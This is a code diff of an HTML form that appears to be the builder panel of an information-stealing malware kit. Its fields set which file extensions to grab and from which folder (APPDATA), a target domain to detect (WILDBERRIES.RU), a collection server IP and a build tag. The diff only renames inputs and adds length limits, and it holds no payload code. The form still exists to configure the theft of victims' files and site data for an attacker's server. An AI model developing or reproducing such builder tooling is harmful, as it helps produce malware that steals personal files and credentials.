@@ -30,24 +30,24 @@
     
     <form action="post" class="form">
         <label for="tag" class="label">
-            build tag
-            <input type="text" class="form__input input" placeholder="BUILD TAG">
+            BUILD TAG
+            <input type="text" class="form__input input" name="tag" placeholder="BUILD TAG" maxlength="27">
         </label>
-        <label for="extensions" class="label">
+        <label for="Grab" class="label">
             FILEGRABBER EXTENSIONS
-            <input id="extensions" type="text" class="form__input input" placeholder=".doc,.png,.txt">
+            <input id="Grab" type="text" class="form__input input" name="grabext" placeholder=".doc,.png,.txt" maxlength="36">
         </label>
-        <label for="path" class="label">
+        <label for="Grabe" class="label">
             FILEGRABBER PATH
-            <input id="path" type="text" class="form__input input" placeholder="APPDATA">
+            <input id="Grabe" type="text" class="form__input input" name="grabpath" placeholder="APPDATA" maxlength="28">
         </label>
         <label for="domain" class="label">
             DOMAIN DETECT
-            <input id="domain" type="text" class="form__input input" placeholder="WILDBERRIES.RU">
+            <input id="Domain" type="text" class="form__input input" name="domaindetect" placeholder="WILDBERRIES.RU" maxlength="27">
         </label>
-        <label for="server" class="label">
+        <label for="serv" class="label">
             SERVER IP
-            <input id="server" type="text" class="form__input input" placeholder="127.0.0.1:28015">
+            <input id="serv" type="text" class="form__input input" name="server" placeholder="127.0.0.1:28015" maxlength="23">
         </label>
         <button class="btn form__btn">build</button>
     </form>
